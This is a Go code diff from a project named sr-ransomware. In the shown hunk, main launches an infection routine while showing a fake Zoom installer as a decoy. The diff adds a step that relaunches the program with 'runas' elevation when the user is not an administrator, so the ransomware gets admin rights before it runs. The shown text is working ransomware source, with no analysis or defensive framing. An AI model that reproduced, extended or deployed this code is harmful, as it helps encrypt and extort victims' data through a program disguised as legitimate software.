@@ -2,11 +2,20 @@
 
 package main
 
-import "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
+import (
+    "os"
+
+    "github.com/sug0/sr-ransomware/go/crypto/win"
+    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
+)
 
 //go:generate go run generate/cryptoservice_buffer.go
 
 func main() {
+    if !win.IsUserAnAdmin() {
+        win.ShellExecute("runas", os.Args[0], win.SW_SHOW)
+        return
+    }
     done := make(chan struct{})
     go runInfection(done)
     victim.RunZoomInstaller()
